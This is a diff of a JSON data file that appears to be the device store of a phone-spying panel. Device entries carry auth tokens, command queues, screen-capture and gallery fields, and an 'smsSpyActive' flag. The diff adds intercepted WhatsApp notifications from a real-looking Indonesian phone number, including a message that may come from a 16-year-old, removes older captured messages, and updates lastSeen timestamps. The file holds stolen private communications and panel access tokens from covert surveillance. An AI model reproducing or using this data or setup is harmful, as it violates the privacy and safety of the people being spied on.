@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777350360678,
+    "lastSeen": 1777350387790,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -458,7 +458,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777350362430,
+    "lastSeen": 1777350389445,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -474,6 +474,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 852-3694-0729",
+        "content": "gua aja mala 16 tahun",
+        "time": "28/04 11:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777350389845
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 852-3694-0729",
+        "content": "gua aja mala 16 tahun",
+        "time": "28/04 11:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777350389749
+      },
       {
         "appName": "WhatsApp",
         "sender": "+62 852-3694-0729",
@@ -4457,22 +4473,6 @@
         "time": "27/04 18:46",
         "pkg": "com.whatsapp",
         "receivedAt": 1777290366917
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎150 pesan dari 3 chat",
-        "time": "27/04 18:45",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777290360752
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GC STOK RECEH👻 (6 pesan): ~ Ayu~stecuu🌚",
-        "content": "Toxic",
-        "time": "27/04 18:45",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777290360747
       }
     ],
     "galleryPhotos": [],
@@ -4491,7 +4491,7 @@
     "deviceName": "HP-KONTOL-A754",
     "ownerUsername": "Ubill_raa",
     "token": "bfb9af2cf50b25656e3283905dce6368",
-    "lastSeen": 1777350361410,
+    "lastSeen": 1777350388308,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-28T04:01:30.004Z",
